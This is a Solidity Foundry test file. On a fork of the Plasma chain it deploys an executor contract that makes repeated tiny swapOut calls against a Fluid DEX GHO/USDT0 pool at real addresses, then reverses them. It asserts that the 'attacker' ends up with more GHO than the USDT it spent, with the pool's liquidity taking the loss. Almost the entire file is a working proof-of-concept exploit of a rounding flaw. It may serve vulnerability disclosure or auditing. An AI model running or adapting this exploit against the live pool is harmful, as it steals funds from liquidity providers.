// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20NoSynthetic {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFluidDexNoSynthetic {
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

contract PlasmaNoSyntheticExecutor {
    address internal constant POOL = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    uint256 internal constant GHO_OUT_EACH = 256_000_000_000_001;

    uint256 public pendingUsdtOutput;
    uint256 public completedForwardRounds;

    constructor() {
        require(IERC20NoSynthetic(GHO).approve(POOL, type(uint256).max), "GHO_APPROVE");
        require(IERC20NoSynthetic(USDT0).approve(POOL, type(uint256).max), "USDT_APPROVE");
    }

    function forwardChunk(uint256 rounds) external returns (uint256 chunkUsdtInput) {
        for (uint256 i; i < rounds; ++i) {
            chunkUsdtInput += IFluidDexNoSynthetic(POOL).swapOut(
                false, GHO_OUT_EACH, type(uint256).max, address(this)
            );
        }
        pendingUsdtOutput += chunkUsdtInput;
        completedForwardRounds += rounds;
    }

    function reverseAndReset() external returns (uint256 ghoInput, uint256 restoredUsdt) {
        restoredUsdt = pendingUsdtOutput;
        require(restoredUsdt > 0, "NO_PENDING_USDT");
        ghoInput = IFluidDexNoSynthetic(POOL).swapOut(
            true, restoredUsdt, type(uint256).max, address(this)
        );
        pendingUsdtOutput = 0;
    }
}

contract PlasmaGhoUsdtNoSyntheticBalancesTest is Test {
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;
    address internal constant LIVE_HOLDER = 0x8741B106e9738a6971AD07DABCFe95FF66337b51;

    uint256 internal constant FUNDING = 1_000_000; // ordinary existing 1 USDT0
    uint256 internal constant SEQUENCES = 4;
    uint256 internal constant CHUNKS_PER_SEQUENCE = 8;
    uint256 internal constant ROUNDS_PER_CHUNK = 256;
    uint256 internal constant CALL_GAS_CAP = 35_000_000;
    uint256 internal constant TX_OVERHEAD = 50_000;

    event ExistingTokenFunding(
        uint256 totalSupplyBefore,
        uint256 totalSupplyAfter,
        uint256 holderDebit,
        uint256 executorCredit
    );

    event NoSyntheticExtraction(
        uint256 sequences,
        uint256 forwardRounds,
        uint256 simulatedTransactions,
        uint256 attackerUsdtLoss,
        uint256 attackerGhoGain,
        uint256 liquidityUsdtGain,
        uint256 liquidityGhoLoss,
        uint256 executionGas,
        uint256 maxTransactionGas
    );

    function setUp() public {
        vm.createSelectFork(
            vm.envString("PLASMA_RPC_URL"),
            vm.envUint("PLASMA_FORK_BLOCK")
        );
        assertEq(block.chainid, 9745, "unexpected chain");
    }

    function _advanceBlock() internal {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);
    }

    function _call(address target, bytes memory data) internal returns (uint256 gasUsed) {
        uint256 beforeGas = gasleft();
        (bool ok, bytes memory reason) = target.call{gas: CALL_GAS_CAP}(data);
        gasUsed = beforeGas - gasleft();
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(reason, 32), mload(reason))
            }
        }
    }

    function test_fourSequences_useOnlyExistingUsdt_andDebitFluidLiquidity() public {
        PlasmaNoSyntheticExecutor executor = new PlasmaNoSyntheticExecutor();
        assertEq(IERC20NoSynthetic(GHO).balanceOf(address(executor)), 0, "synthetic GHO seed");
        assertEq(IERC20NoSynthetic(USDT0).balanceOf(address(executor)), 0, "synthetic USDT seed");

        uint256 usdtSupplyBeforeFunding = IERC20NoSynthetic(USDT0).totalSupply();
        uint256 holderBefore = IERC20NoSynthetic(USDT0).balanceOf(LIVE_HOLDER);
        vm.prank(LIVE_HOLDER);
        require(IERC20NoSynthetic(USDT0).transfer(address(executor), FUNDING), "LIVE_TRANSFER");
        uint256 holderAfter = IERC20NoSynthetic(USDT0).balanceOf(LIVE_HOLDER);
        uint256 usdtSupplyAfterFunding = IERC20NoSynthetic(USDT0).totalSupply();

        assertEq(usdtSupplyAfterFunding, usdtSupplyBeforeFunding, "USDT supply changed");
        assertEq(holderBefore - holderAfter, FUNDING, "holder was not debited");
        assertEq(IERC20NoSynthetic(USDT0).balanceOf(address(executor)), FUNDING, "executor not funded");
        emit ExistingTokenFunding(
            usdtSupplyBeforeFunding,
            usdtSupplyAfterFunding,
            holderBefore - holderAfter,
            FUNDING
        );

        uint256 attackerUsdtBefore = IERC20NoSynthetic(USDT0).balanceOf(address(executor));
        uint256 attackerGhoBefore = IERC20NoSynthetic(GHO).balanceOf(address(executor));
        uint256 liquidityUsdtBefore = IERC20NoSynthetic(USDT0).balanceOf(LIQUIDITY);
        uint256 liquidityGhoBefore = IERC20NoSynthetic(GHO).balanceOf(LIQUIDITY);
        uint256 ghoSupplyBefore = IERC20NoSynthetic(GHO).totalSupply();
        uint256 usdtSupplyBefore = IERC20NoSynthetic(USDT0).totalSupply();

        uint256 executionGas;
        uint256 maxTransactionGas;
        for (uint256 sequence; sequence < SEQUENCES; ++sequence) {
            for (uint256 chunk; chunk < CHUNKS_PER_SEQUENCE; ++chunk) {
                uint256 used = _call(
                    address(executor),
                    abi.encodeCall(PlasmaNoSyntheticExecutor.forwardChunk, (ROUNDS_PER_CHUNK))
                );
                executionGas += used;
                if (used > maxTransactionGas) maxTransactionGas = used;
                assertLt(used + TX_OVERHEAD, block.gaslimit, "forward tx exceeds block limit");
                _advanceBlock();
            }

            uint256 reverseUsed = _call(
                address(executor),
                abi.encodeCall(PlasmaNoSyntheticExecutor.reverseAndReset, ())
            );
            executionGas += reverseUsed;
            if (reverseUsed > maxTransactionGas) maxTransactionGas = reverseUsed;
            assertLt(reverseUsed + TX_OVERHEAD, block.gaslimit, "reverse tx exceeds block limit");
            _advanceBlock();
        }

        uint256 attackerUsdtAfter = IERC20NoSynthetic(USDT0).balanceOf(address(executor));
        uint256 attackerGhoAfter = IERC20NoSynthetic(GHO).balanceOf(address(executor));
        uint256 liquidityUsdtAfter = IERC20NoSynthetic(USDT0).balanceOf(LIQUIDITY);
        uint256 liquidityGhoAfter = IERC20NoSynthetic(GHO).balanceOf(LIQUIDITY);

        uint256 attackerUsdtLoss = attackerUsdtBefore - attackerUsdtAfter;
        uint256 attackerGhoGain = attackerGhoAfter - attackerGhoBefore;
        uint256 liquidityUsdtGain = liquidityUsdtAfter - liquidityUsdtBefore;
        uint256 liquidityGhoLoss = liquidityGhoBefore - liquidityGhoAfter;

        assertEq(IERC20NoSynthetic(GHO).totalSupply(), ghoSupplyBefore, "GHO supply changed");
        assertEq(IERC20NoSynthetic(USDT0).totalSupply(), usdtSupplyBefore, "USDT supply changed");
        assertEq(attackerUsdtLoss, liquidityUsdtGain, "USDT accounting mismatch");
        assertEq(attackerGhoGain, liquidityGhoLoss, "GHO accounting mismatch");
        assertGt(attackerGhoGain, attackerUsdtLoss * 1e12, "not profitable at stable parity");
        assertEq(executor.pendingUsdtOutput(), 0, "cycle not closed");
        assertEq(
            executor.completedForwardRounds(),
            SEQUENCES * CHUNKS_PER_SEQUENCE * ROUNDS_PER_CHUNK,
            "round count mismatch"
        );

        emit NoSyntheticExtraction(
            SEQUENCES,
            executor.completedForwardRounds(),
            SEQUENCES * (CHUNKS_PER_SEQUENCE + 1),
            attackerUsdtLoss,
            attackerGhoGain,
            liquidityUsdtGain,
            liquidityGhoLoss,
            executionGas,
            maxTransactionGas
        );
    }
}
